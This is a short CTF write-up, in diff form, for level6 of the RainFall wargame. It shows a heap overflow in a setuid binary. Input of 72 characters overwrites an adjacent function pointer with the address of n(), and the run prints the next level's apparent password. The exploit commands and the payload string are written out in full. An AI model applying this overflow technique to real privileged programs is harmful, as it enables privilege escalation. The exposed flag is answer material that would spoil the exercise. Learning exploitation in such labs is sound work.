@@ -1,0 +1,33 @@
+level6@RainFall:~$ ls -l
+total 8
+-rwsr-s---+ 1 level7 users 5274 Mar  6  2016 level6
+
+level6@RainFall:~$ ./level6 
+Segmentation fault (core dumped)
+
+level6@RainFall:~$ ./level6 yes
+Nope
+
+--> Function uses argv to copy it in a string
+
+Useful addresses:
+m
+08048468 g     F .text	00000014              m
+n
+08048454 g     F .text	00000014              n
+
+level6@RainFall:~$ ./level6 $(python -c "print('a'*72)")
+Segmentation fault (core dumped)
+level6@RainFall:~$ ./level6 $(python -c "print('a'*71)")
+Nope
+
+→ 72th char create a segfault
+
+Objective: write more than 72 char, to write on the address allocated for func
+Since func has been malloc just after str, the addresses are (here) contiguous
+We'll replace the value in func (m()) to n() address
+
+level6@RainFall:~$ ./level6 $(python -c "print('a'*72 + '\x54\x84\x04\x08')")
+f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
+
+(Again address is in little endian 08048454 == \x54\x84\x04\x08)
